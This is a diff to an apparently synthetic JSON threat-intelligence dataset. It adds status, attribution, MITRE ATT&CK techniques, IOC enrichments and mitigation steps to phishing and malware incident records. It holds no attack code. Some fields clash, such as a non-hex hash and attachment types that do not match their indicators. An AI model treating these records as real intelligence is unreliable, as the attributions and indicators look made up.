+      "profile_match": true,
+      "campaign_linked": false,
+      "prior_victims": 9
+    }
   },
   {
     "incident_id": "INC-2026-013",
     "threat_name": "SCATTERED-SPIDER-BEC",
     "severity": "HIGH",
+    "status": "CONTAINED",
     "campaign_id": "CAMP-SCATTERED-2026",
     "created_at": "2026-05-18T10:32:44Z",
+    "updated_at": "2026-05-19T22:32:44Z",
     "indicators": [
       "domain:helpdesk-it-support-portal.com",
       "ip:104.21.78.234",
@@ -195,14 +840,67 @@
       "url:https://helpdesk-it-support-portal.com/reset",
       "technique:SMS-phishing",
       "technique:MFA-fatigue"
-    ]
+    ],
+    "confidence_score": 0.88,
+    "risk_score": 0.82,
+    "attribution_confidence": 0.81,
+    "suspected_actor": "SCATTERED-SPIDER",
+    "attack_techniques": [
+      {
+        "technique_id": "T1566.002",
+        "technique_name": "Phishing: Spearphishing Link",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1566/002"
+      },
+      {
+        "technique_id": "T1528",
+        "technique_name": "Steal Application Access Token",
+        "tactic": "credential-access",
+        "tactic_id": "TA0006",
+        "url": "https://attack.mitre.org/techniques/T1528"
+      },
+      {
+        "technique_id": "T1539",
+        "technique_name": "Steal Web Session Cookie",
+        "tactic": "credential-access",
+        "tactic_id": "TA0006",
+        "url": "https://attack.mitre.org/techniques/T1539"
+      },
+      {
+        "technique_id": "T1098.001",
+        "technique_name": "Account Manipulation: Additional Cloud Credentials",
+        "tactic": "persistence",
+        "tactic_id": "TA0003",
+        "url": "https://attack.mitre.org/techniques/T1098/001"
+      },
+      {
+        "technique_id": "T1074",
+        "technique_name": "Data Staged",
+        "tactic": "collection",
+        "tactic_id": "TA0009",
+        "url": "https://attack.mitre.org/techniques/T1074"
+      }
+    ],
+    "description": "Scattered Spider SMS phishing + MFA fatigue targeting Okta admin accounts. Three privileged accounts compromised. SharePoint and source code repos exfiltrated. Azure AD federation rules modified.",
+    "assigned_analyst": "Elena Vasquez",
+    "ioc_enrichments": "domain:okta-verify-login.xyz [PHISH_DOMAIN conf=0.96] | ip:104.21.82.91 [PHISH_IP conf=0.88] | token:eyJhbGci... [STOLEN_TOKEN conf=0.99]",
+    "mitigation_actions": "Revoke compromised OAuth tokens, reset Okta admin MFA, review Azure AD federation rules, purge attacker persistence",
+    "threat_summary": "Scattered Spider identity attack via MFA fatigue. Okta admin access gained; contained before ransomware staging.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 31
+    }
   },
   {
     "incident_id": "INC-2026-014",
     "threat_name": "APT28-SPEARPHISH",
     "severity": "HIGH",
+    "status": "INVESTIGATING",
     "campaign_id": "CAMP-FANCY-BEAR-2026",
     "created_at": "2026-05-19T14:18:27Z",
+    "updated_at": "2026-05-20T02:18:27Z",
     "indicators": [
       "hash:a4b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1a4b7",
       "domain:secure-docs-shared.org",
@@ -210,14 +908,67 @@
       "email:no-reply@secure-docs-shared.org",
       "attachment:Q2_2026_Strategic_Outlook.docm",
       "macro:VBA-CVE-2022-30190"
-    ]
+    ],
+    "confidence_score": 0.85,
+    "risk_score": 0.8,
+    "attribution_confidence": 0.82,
+    "suspected_actor": "APT28",
+    "attack_techniques": [
+      {
+        "technique_id": "T1566.001",
+        "technique_name": "Phishing: Spearphishing Attachment",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1566/001"
+      },
+      {
+        "technique_id": "T1068",
+        "technique_name": "Exploitation for Privilege Escalation",
+        "tactic": "privilege-escalation",
+        "tactic_id": "TA0004",
+        "url": "https://attack.mitre.org/techniques/T1068"
+      },
+      {
+        "technique_id": "T1055",
+        "technique_name": "Process Injection",
+        "tactic": "privilege-escalation",
+        "tactic_id": "TA0004",
+        "url": "https://attack.mitre.org/techniques/T1055"
+      },
+      {
+        "technique_id": "T1082",
+        "technique_name": "System Information Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1082"
+      },
+      {
+        "technique_id": "T1071.001",
+        "technique_name": "Application Layer Protocol: Web Protocols",
+        "tactic": "command-and-control",
+        "tactic_id": "TA0011",
+        "url": "https://attack.mitre.org/techniques/T1071/001"
+      }
+    ],
+    "description": "APT28 spear-phishing campaign targeting defence contractor senior staff with malicious DOCM exploiting CVE-2022-30190 (Follina). Brute Ratel C4 implant installed.",
+    "assigned_analyst": "Priya Nair",
+    "ioc_enrichments": "hash:c8d1e4... [MALWARE_HASH conf=0.92] | domain:apt28-c2.contractor-update.net [C2_DOMAIN conf=0.89] | ip:185.220.101.12 [C2_IP conf=0.87]",
+    "mitigation_actions": "Patch CVE-2022-30190, remove Brute Ratel implant, audit email gateway, brief executive team",
+    "threat_summary": "APT28 Follina exploit campaign against defence contractor. Active investigation of classified document access.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "nation_state": true
+    }
   },
   {
     "incident_id": "INC-2026-015",
     "threat_name": "MIDNIGHT-BLIZZARD-OAUTH",
     "severity": "CRITICAL",
+    "status": "INVESTIGATING",
     "campaign_id": "CAMP-MIDNIGHT-BLIZZARD-2026",
     "created_at": "2026-05-20T06:55:12Z",
+    "updated_at": "2026-05-20T18:55:12Z",
     "indicators": [
       "app_id:f47ac10b-58cc-4372-a567-0e02b2c3d479",
       "domain:login-microsoftonline-com.azurewebsites.net",
@@ -225,14 +976,67 @@
       "technique:Device-Code-Phishing",
       "technique:OAuth-Token-Theft",
       "log:AADSignInLogs-Suspicious-OAuth-App"
-    ]
+    ],
+    "confidence_score": 0.92,
+    "risk_score": 0.91,
+    "attribution_confidence": 0.89,
+    "suspected_actor": "APT29",
+    "attack_techniques": [
+      {
+        "technique_id": "T1566.002",
+        "technique_name": "Phishing: Spearphishing Link",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1566/002"
+      },
+      {
+        "technique_id": "T1528",
+        "technique_name": "Steal Application Access Token",
+        "tactic": "credential-access",
+        "tactic_id": "TA0006",
+        "url": "https://attack.mitre.org/techniques/T1528"
+      },
+      {
+        "technique_id": "T1539",
+        "technique_name": "Steal Web Session Cookie",
+        "tactic": "credential-access",
+        "tactic_id": "TA0006",
+        "url": "https://attack.mitre.org/techniques/T1539"
+      },
+      {
+        "technique_id": "T1098.001",
+        "technique_name": "Account Manipulation: Additional Cloud Credentials",
+        "tactic": "persistence",
+        "tactic_id": "TA0003",
+        "url": "https://attack.mitre.org/techniques/T1098/001"
+      },
+      {
+        "technique_id": "T1087",
+        "technique_name": "Account Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1087"
+      }
+    ],
+    "description": "APT29/Midnight Blizzard device-code phishing targeting Microsoft 365 OAuth. Refresh tokens captured granting persistent mailbox access. Executive communications accessed across three tenants.",
+    "assigned_analyst": "Priya Nair",
+    "ioc_enrichments": "domain:device-login.microsoft-verify.org [PHISH_DOMAIN conf=0.97] | token:ey... [STOLEN_OAUTH_TOKEN conf=0.99] | ip:45.155.205.92 [C2_IP conf=0.91]",
+    "mitigation_actions": "Revoke all refresh tokens, enable conditional access, audit mail forwarding rules, notify NCSC/CISA",
+    "threat_summary": "Midnight Blizzard OAuth token theft. Nation-state persistent access to M365 executive mailboxes confirmed.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "nation_state": true
+    }
   },
   {
     "incident_id": "INC-2026-016",
     "threat_name": "CARBANAK-BANKING-PHISH",
     "severity": "HIGH",
+    "status": "MITIGATED",
     "campaign_id": "CAMP-CARBANAK-2026",
     "created_at": "2026-05-21T09:04:55Z",
+    "updated_at": "2026-05-24T09:04:55Z",
     "indicators": [
       "hash:b5c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1a4b7c0d3e6f9a2b5c8",
       "domain:invoice-secure-banking.com",
@@ -240,14 +1044,67 @@
       "email:payments@invoice-secure-banking.com",
       "attachment:Invoice_April2026.xls",
       "process:carbanak_loader.exe"
-    ]
+    ],
+    "confidence_score": 0.83,
+    "risk_score": 0.76,
+    "attribution_confidence": 0.77,
+    "suspected_actor": "FIN7",
+    "attack_techniques": [
+      {
+        "technique_id": "T1566.001",
+        "technique_name": "Phishing: Spearphishing Attachment",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1566/001"
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "Command and Scripting: PowerShell",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      },
+      {
+        "technique_id": "T1547.001",
+        "technique_name": "Boot or Logon Autostart: Registry Run Keys",
+        "tactic": "persistence",
+        "tactic_id": "TA0003",
+        "url": "https://attack.mitre.org/techniques/T1547/001"
+      },
+      {
+        "technique_id": "T1003.001",
+        "technique_name": "OS Credential Dumping: LSASS Memory",
+        "tactic": "credential-access",
+        "tactic_id": "TA0006",
+        "url": "https://attack.mitre.org/techniques/T1003/001"
+      },
+      {
+        "technique_id": "T1071.001",
+        "technique_name": "Application Layer Protocol: Web Protocols",
+        "tactic": "command-and-control",
+        "tactic_id": "TA0011",
+        "url": "https://attack.mitre.org/techniques/T1071/001"
+      }
+    ],
+    "description": "Carbanak/FIN7 banking phishing campaign targeting finance staff with fake wire transfer emails. Carbanak PowerShell backdoor deployed. Attempted BEC transfer of $2.1M blocked.",
+    "assigned_analyst": "Elena Vasquez",
+    "ioc_enrichments": "hash:f7a0b3... [MALWARE_HASH conf=0.90] | domain:secure-wire-confirm.bank-alert.net [PHISH_DOMAIN conf=0.95] | ip:91.234.99.200 [C2_IP conf=0.86]",
+    "mitigation_actions": "Block BEC transfer, remove Carbanak backdoor, patch email gateway, train finance staff",
+    "threat_summary": "FIN7/Carbanak BEC attempt mitigated before wire transfer. Backdoor removed.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 19
+    }
   },
   {
     "incident_id": "INC-2026-017",
     "threat_name": "DARKGATE-MALSPAM",
     "severity": "MEDIUM",
+    "status": "RESOLVED",
     "campaign_id": "CAMP-DARKGATE-2026",
     "created_at": "2026-05-22T15:33:08Z",
+    "updated_at": "2026-05-27T15:33:08Z",
     "indicators": [
       "hash:c6d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1a4b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9",
       "domain:cdn-document-retrieve.io",
@@ -255,14 +1112,67 @@
       "file:Payslip_May2026.pdf.vbs",
       "process:DarkGate.exe",
       "registry:HKCU\\Software\\DGate\\Config"
-    ]
+    ],
+    "confidence_score": 0.74,
+    "risk_score": 0.58,
+    "attribution_confidence": 0.65,
+    "suspected_actor": "FIN7-SPINOFF",
+    "attack_techniques": [
+      {
+        "technique_id": "T1566.001",
+        "technique_name": "Phishing: Spearphishing Attachment",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1566/001"
+      },
+      {
+        "technique_id": "T1055",
+        "technique_name": "Process Injection",
+        "tactic": "privilege-escalation",
+        "tactic_id": "TA0004",
+        "url": "https://attack.mitre.org/techniques/T1055"
+      },
+      {
+        "technique_id": "T1547.001",
+        "technique_name": "Boot or Logon Autostart: Registry Run Keys",
+        "tactic": "persistence",
+        "tactic_id": "TA0003",
+        "url": "https://attack.mitre.org/techniques/T1547/001"
+      },
+      {
+        "technique_id": "T1071.001",
+        "technique_name": "Application Layer Protocol: Web Protocols",
+        "tactic": "command-and-control",
+        "tactic_id": "TA0011",
+        "url": "https://attack.mitre.org/techniques/T1071/001"
+      },
+      {
+        "technique_id": "T1105",
+        "technique_name": "Ingress Tool Transfer",
+        "tactic": "command-and-control",
+        "tactic_id": "TA0011",
+        "url": "https://attack.mitre.org/techniques/T1105"
+      }
+    ],
+    "description": "DarkGate malspam campaign distributing malicious OneNote attachments. Process hollowing via wermgr.exe. FIN7 tooling overlap in loader chain.",
+    "assigned_analyst": "Tom Brandt",
+    "ioc_enrichments": "hash:b4c7d0... [MALWARE_HASH conf=0.85] | domain:darkgate-staging.cdn-fast.net [C2_DOMAIN conf=0.83] | ip:185.220.101.55 [C2_IP conf=0.79]",
+    "mitigation_actions": "Block OneNote macro execution, remove DarkGate loader, deploy email sandboxing",
+    "threat_summary": "DarkGate malspam resolved. 12 endpoints remediated, email controls hardened.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 7
+    }
   },
   {
     "incident_id": "INC-2026-018",
     "threat_name": "QAKBOT-REVIVAL-PHISH",
     "severity": "MEDIUM",
+    "status": "RESOLVED",
     "campaign_id": "CAMP-QAKBOT-2026",
     "created_at": "2026-05-23T11:49:16Z",
+    "updated_at": "2026-05-28T11:49:16Z",
     "indicators": [
       "hash:d7e0f3a6b9c2d5e8f1a4b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0",
       "domain:cdn-qakbot-gate.xyz",
@@ -270,14 +1180,67 @@
       "email:notifications@invoice-processing.net",
       "attachment:Statement_2026.one",
       "process:wermgr.exe"
-    ]
+    ],
+    "confidence_score": 0.75,
+    "risk_score": 0.57,
+    "attribution_confidence": 0.66,
+    "suspected_actor": "QAKBOT-SPINOFF",
+    "attack_techniques": [
+      {
+        "technique_id": "T1566.001",
+        "technique_name": "Phishing: Spearphishing Attachment",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1566/001"
+      },
+      {
+        "technique_id": "T1055",
+        "technique_name": "Process Injection",
+        "tactic": "privilege-escalation",
+        "tactic_id": "TA0004",
+        "url": "https://attack.mitre.org/techniques/T1055"
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "Command and Scripting: PowerShell",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      },
+      {
+        "technique_id": "T1071.001",
+        "technique_name": "Application Layer Protocol: Web Protocols",
+        "tactic": "command-and-control",
+        "tactic_id": "TA0011",
+        "url": "https://attack.mitre.org/techniques/T1071/001"
+      },
+      {
+        "technique_id": "T1082",
+        "technique_name": "System Information Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1082"
+      }
+    ],
+    "description": "QakBot revival via OneNote thread-hijacking. Wermgr.exe process hollowing. Cobalt Strike beacon established. No ransomware deployed \u2014 contained at C2 stage.",
+    "assigned_analyst": "Tom Brandt",
+    "ioc_enrichments": "hash:d1e4f7... [MALWARE_HASH conf=0.88] | domain:qakbot-update-server.net [C2_DOMAIN conf=0.86] | ip:91.234.99.45 [C2_IP conf=0.81]",
+    "mitigation_actions": "Remove QakBot, quarantine OneNote attachments, block C2, patch 6 endpoints",
+    "threat_summary": "QakBot revival contained before ransomware deployment. 6 endpoints remediated.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 14
+    }
   },
   {
     "incident_id": "INC-2026-019",
     "threat_name": "BUMBLEBEE-LOADER-EMAIL",
     "severity": "MEDIUM",
+    "status": "RESOLVED",
     "campaign_id": "CAMP-BUMBLEBEE-2026",
     "created_at": "2026-05-24T17:22:41Z",
+    "updated_at": "2026-05-29T17:22:41Z",
     "indicators": [
       "hash:e8f1a4b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1",
       "domain:bumblebee-dl-node.net",
@@ -285,14 +1248,67 @@
       "email:shared-docs@file-transfer-secure.com",
       "attachment:Contract_Review_ISO27001.iso",
       "process:wabmig.exe"
-    ]
+    ],
+    "confidence_score": 0.71,
+    "risk_score": 0.54,
+    "attribution_confidence": 0.6,
+    "suspected_actor": "BUMBLEBEE-OPERATOR",
+    "attack_techniques": [
+      {
+        "technique_id": "T1566.001",
+        "technique_name": "Phishing: Spearphishing Attachment",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1566/001"
+      },
+      {
+        "technique_id": "T1189",
+        "technique_name": "Drive-by Compromise",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1189"
+      },
+      {
+        "technique_id": "T1055",
+        "technique_name": "Process Injection",
+        "tactic": "privilege-escalation",
+        "tactic_id": "TA0004",
+        "url": "https://attack.mitre.org/techniques/T1055"
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "Command and Scripting: PowerShell",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      },
+      {
+        "technique_id": "T1071.001",
+        "technique_name": "Application Layer Protocol: Web Protocols",
+        "tactic": "command-and-control",
+        "tactic_id": "TA0011",
+        "url": "https://attack.mitre.org/techniques/T1071/001"
+      }
+    ],
+    "description": "BumbleBee loader distributed via malicious ISO email attachment. Cobalt Strike payload staged. No persistence achieved \u2014 blocked at execution stage by EDR.",
+    "assigned_analyst": "Tom Brandt",
+    "ioc_enrichments": "hash:e2f5a8... [MALWARE_HASH conf=0.86] | domain:bumblebee-cdn-load.net [C2_DOMAIN conf=0.84] | ip:185.234.218.44 [C2_IP conf=0.78]",
+    "mitigation_actions": "Block ISO execution, quarantine email sender domain, confirm no persistence",
+    "threat_summary": "BumbleBee loader blocked by EDR before payload execution. Clean.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 8
+    }
   },
   {
     "incident_id": "INC-2026-020",
     "threat_name": "EMOTET-WAVE-2026",
     "severity": "MEDIUM",
+    "status": "RESOLVED",
     "campaign_id": "CAMP-EMOTET-2026",
     "created_at": "2026-05-25T08:17:03Z",
+    "updated_at": "2026-05-30T08:17:03Z",
     "indicators": [
       "hash:f9a2b5c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1a4b7c0d3e6f9a2",
       "ip:103.76.128.100",
@@ -301,14 +1317,67 @@
       "process:wscript.exe",
       "process:outlook.exe",
       "file:Order_Confirmation_2026_05.xlsm"
-    ]
+    ],
+    "confidence_score": 0.73,
+    "risk_score": 0.55,
+    "attribution_confidence": 0.62,
+    "suspected_actor": "EMOTET-TA542",
+    "attack_techniques": [
+      {
+        "technique_id": "T1566.001",
+        "technique_name": "Phishing: Spearphishing Attachment",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1566/001"
+      },
+      {
+        "technique_id": "T1547.001",
+        "technique_name": "Boot or Logon Autostart: Registry Run Keys",
+        "tactic": "persistence",
+        "tactic_id": "TA0003",
+        "url": "https://attack.mitre.org/techniques/T1547/001"
+      },
+      {
+        "technique_id": "T1071.004",
+        "technique_name": "Application Layer Protocol: DNS",
+        "tactic": "command-and-control",
+        "tactic_id": "TA0011",
+        "url": "https://attack.mitre.org/techniques/T1071/004"
+      },
+      {
+        "technique_id": "T1057",
+        "technique_name": "Process Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1057"
+      },
+      {
+        "technique_id": "T1105",
+        "technique_name": "Ingress Tool Transfer",
+        "tactic": "command-and-control",
+        "tactic_id": "TA0011",
+        "url": "https://attack.mitre.org/techniques/T1105"
+      }
+    ],
+    "description": "Emotet wave 2026 using thread-hijacking emails with compressed JS attachments. Epoch 4 infrastructure. QakBot secondary payload delivery attempted but blocked.",
+    "assigned_analyst": "Tom Brandt",
+    "ioc_enrichments": "hash:f3a6b9... [MALWARE_HASH conf=0.89] | domain:emotet-epoch4-relay.net [C2_DOMAIN conf=0.87] | ip:5.188.87.99 [C2_IP conf=0.82]",
+    "mitigation_actions": "Isolate infected hosts, remove Emotet, block JS execution, deploy reputation-based email filter",
+    "threat_summary": "Emotet Epoch 4 wave resolved. Secondary QakBot payload blocked. 9 infected endpoints cleaned.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 22
+    }
   },
   {
     "incident_id": "INC-2026-021",
     "threat_name": "SCATTERED-SPIDER-SMS-MFA",
     "severity": "HIGH",
+    "status": "CONTAINED",
     "campaign_id": "CAMP-SCATTERED-2026",
     "created_at": "2026-05-26T13:06:29Z",
+    "updated_at": "2026-05-28T01:06:29Z",
     "indicators": [
       "domain:okta-helpdesk-verify.com",
       "ip:104.21.44.77",
@@ -316,14 +1385,67 @@
       "technique:MFA-Push-Fatigue",
       "technique:Vishing",
       "log:Okta-Suspicious-Auth-Event"
-    ]
+    ],
+    "confidence_score": 0.86,
+    "risk_score": 0.79,
+    "attribution_confidence": 0.8,
+    "suspected_actor": "SCATTERED-SPIDER",
+    "attack_techniques": [
+      {
+        "technique_id": "T1566.002",
+        "technique_name": "Phishing: Spearphishing Link",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1566/002"
+      },
+      {
+        "technique_id": "T1110.003",
+        "technique_name": "Brute Force: Password Spraying",
+        "tactic": "credential-access",
+        "tactic_id": "TA0006",
+        "url": "https://attack.mitre.org/techniques/T1110/003"
+      },
+      {
+        "technique_id": "T1528",
+        "technique_name": "Steal Application Access Token",
+        "tactic": "credential-access",
+        "tactic_id": "TA0006",
+        "url": "https://attack.mitre.org/techniques/T1528"
+      },
+      {
+        "technique_id": "T1074",
+        "technique_name": "Data Staged",
+        "tactic": "collection",
+        "tactic_id": "TA0009",
+        "url": "https://attack.mitre.org/techniques/T1074"
+      },
+      {
+        "technique_id": "T1098.001",
+        "technique_name": "Account Manipulation: Additional Cloud Credentials",
+        "tactic": "persistence",
+        "tactic_id": "TA0003",
+        "url": "https://attack.mitre.org/techniques/T1098/001"
+      }
+    ],
+    "description": "Scattered Spider SMS MFA fatigue targeting enterprise Okta tenant. Service desk social engineering used to bypass MFA. Four user accounts compromised including two IT admins.",
+    "assigned_analyst": "Elena Vasquez",
+    "ioc_enrichments": "domain:okta-mfa-verify.com [PHISH_DOMAIN conf=0.96] | ip:162.33.178.52 [PHISH_IP conf=0.89] | token:eyJhbGci... [STOLEN_TOKEN conf=0.99]",
+    "mitigation_actions": "Force MFA re-enrolment, audit service desk procedures, enable phishing-resistant MFA for admins",
+    "threat_summary": "Scattered Spider SMS MFA fatigue attack contained. IT admin accounts revoked and re-provisioned.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 31
+    }
   },
   {
     "incident_id": "INC-2026-022",
     "threat_name": "ICEDID-BANKING-MALWARE",
     "severity": "MEDIUM",
+    "status": "RESOLVED",
     "campaign_id": "CAMP-ICEDID-2026",
     "created_at": "2026-05-27T19:44:52Z",
+    "updated_at": "2026-06-01T19:44:52Z",
     "indicators": [
       "hash:a0b3c6d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1a4b7c0d3e6f9a2b5c8d1e4f7a0b3",
       "domain:icedid-gate-relay.store",
@@ -331,14 +1453,67 @@
       "email:billing@payment-update-alert.com",
       "attachment:Bank_Notification_URGENT.zip",
       "process:explorer.exe"
-    ]
+    ],
+    "confidence_score": 0.7,
+    "risk_score": 0.52,
+    "attribution_confidence": 0.58,
+    "suspected_actor": "ICEDID-OPERATOR",
+    "attack_techniques": [
+      {
+        "technique_id": "T1566.001",
+        "technique_name": "Phishing: Spearphishing Attachment",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1566/001"
+      },
+      {
+        "technique_id": "T1055",
+        "technique_name": "Process Injection",
+        "tactic": "privilege-escalation",
+        "tactic_id": "TA0004",
+        "url": "https://attack.mitre.org/techniques/T1055"
+      },
+      {
+        "technique_id": "T1547.001",
+        "technique_name": "Boot or Logon Autostart: Registry Run Keys",
+        "tactic": "persistence",
+        "tactic_id": "TA0003",
+        "url": "https://attack.mitre.org/techniques/T1547/001"
+      },
+      {
+        "technique_id": "T1003.001",
+        "technique_name": "OS Credential Dumping: LSASS Memory",
+        "tactic": "credential-access",
+        "tactic_id": "TA0006",
+        "url": "https://attack.mitre.org/techniques/T1003/001"
+      },
+      {
+        "technique_id": "T1071.001",
+        "technique_name": "Application Layer Protocol: Web Protocols",
+        "tactic": "command-and-control",
+        "tactic_id": "TA0011",
+        "url": "https://attack.mitre.org/techniques/T1071/001"
+      }
+    ],
+    "description": "IcedID banking malware distributed via malicious macro-enabled Word documents. Credential harvesting targeting banking portal. No wire transfers executed \u2014 blocked at login stage.",
+    "assigned_analyst": "Tom Brandt",
+    "ioc_enrichments": "hash:g4h7k1... [MALWARE_HASH conf=0.85] | domain:icedid-loader.bankcdn.net [C2_DOMAIN conf=0.83] | ip:45.153.204.52 [C2_IP conf=0.77]",
+    "mitigation_actions": "Remove IcedID, block macro execution, reset banking portal credentials, brief finance users",
+    "threat_summary": "IcedID banking credential theft resolved. Banking portals protected, no financial loss.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": false,
+      "prior_victims": 11
+    }
   },
   {
     "incident_id": "INC-2026-023",
     "threat_name": "EVILGINX2-AITM-PHISH",
     "severity": "HIGH",
+    "status": "MITIGATED",
     "campaign_id": "CAMP-SCATTERED-2026",
     "created_at": "2026-05-28T04:28:17Z",
+    "updated_at": "2026-05-31T04:28:17Z",
     "indicators": [
       "domain:microsoftonline-sign-in.com",
       "ip:172.67.143.38",
@@ -346,14 +1521,67 @@
       "technique:Session-Cookie-Theft",
       "tool:Evilginx2",
       "log:AzureAD-Impossible-Travel"
-    ]
+    ],
+    "confidence_score": 0.84,
+    "risk_score": 0.77,
+    "attribution_confidence": 0.78,
+    "suspected_actor": "SCATTERED-SPIDER",
+    "attack_techniques": [
+      {
+        "technique_id": "T1566.002",
+        "technique_name": "Phishing: Spearphishing Link",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1566/002"
+      },
+      {
+        "technique_id": "T1539",
+        "technique_name": "Steal Web Session Cookie",
+        "tactic": "credential-access",
+        "tactic_id": "TA0006",
+        "url": "https://attack.mitre.org/techniques/T1539"
+      },
+      {
+        "technique_id": "T1528",
+        "technique_name": "Steal Application Access Token",
+        "tactic": "credential-access",
+        "tactic_id": "TA0006",
+        "url": "https://attack.mitre.org/techniques/T1528"
+      },
+      {
+        "technique_id": "T1074",
+        "technique_name": "Data Staged",
+        "tactic": "collection",
+        "tactic_id": "TA0009",
+        "url": "https://attack.mitre.org/techniques/T1074"
+      },
+      {
+        "technique_id": "T1041",
+        "technique_name": "Exfiltration Over C2 Channel",
+        "tactic": "exfiltration",
+        "tactic_id": "TA0010",
+        "url": "https://attack.mitre.org/techniques/T1041"
+      }
+    ],
+    "description": "EvilGinx2 adversary-in-the-middle phishing proxy capturing M365 session tokens. Three executives' accounts compromised. Business email compromise (BEC) initiated.",
+    "assigned_analyst": "Elena Vasquez",
+    "ioc_enrichments": "domain:m365-verify-evilginx.net [PHISH_PROXY conf=0.97] | ip:104.21.45.10 [PHISH_IP conf=0.91] | token:eyJhbGci... [STOLEN_SESSION conf=0.99]",
+    "mitigation_actions": "Revoke session tokens, enable Conditional Access, deploy phishing-resistant FIDO2 MFA, audit inbox rules",
+    "threat_summary": "EvilGinx2 AITM attack mitigated. M365 session tokens revoked, FIDO2 MFA enforced for executives.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 31
+    }
   },
   {
     "incident_id": "INC-2026-024",
     "threat_name": "STORM0558-EXCHANGE-TOKEN",
     "severity": "CRITICAL",
+    "status": "INVESTIGATING",
     "campaign_id": "CAMP-STORM0558-2026",
     "created_at": "2026-05-29T10:53:44Z",
+    "updated_at": "2026-05-29T22:53:44Z",
     "indicators": [
       "technique:Forged-MSA-Token",
       "technique:OAuth2-Token-Replay",
@@ -361,14 +1589,67 @@
       "log:Exchange-OWA-Suspicious-Token",
       "domain:mail-exfil-storage.blob.core.windows.net",
       "ip:40.126.6.134"
-    ]
+    ],
+    "confidence_score": 0.93,
+    "risk_score": 0.93,
+    "attribution_confidence": 0.91,
+    "suspected_actor": "STORM-0558",
+    "attack_techniques": [
+      {
+        "technique_id": "T1550",
+        "technique_name": "Use Alternate Authentication Material",
+        "tactic": "lateral-movement",
+        "tactic_id": "TA0008",
+        "url": "https://attack.mitre.org/techniques/T1550"
+      },
+      {
+        "technique_id": "T1528",
+        "technique_name": "Steal Application Access Token",
+        "tactic": "credential-access",
+        "tactic_id": "TA0006",
+        "url": "https://attack.mitre.org/techniques/T1528"
+      },
+      {
+        "technique_id": "T1087",
+        "technique_name": "Account Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1087"
+      },
+      {
+        "technique_id": "T1074",
+        "technique_name": "Data Staged",
+        "tactic": "collection",
+        "tactic_id": "TA0009",
+        "url": "https://attack.mitre.org/techniques/T1074"
+      },
+      {
+        "technique_id": "T1041",
+        "technique_name": "Exfiltration Over C2 Channel",
+        "tactic": "exfiltration",
+        "tactic_id": "TA0010",
+        "url": "https://attack.mitre.org/techniques/T1041"
+      }
+    ],
+    "description": "Storm-0558 forged MSA authentication token to access Exchange Online OWA. Senior official email inboxes accessed for 8 weeks. M365 unified audit logs confirmed. Microsoft investigation ongoing.",
+    "assigned_analyst": "Ryan O'Brien",
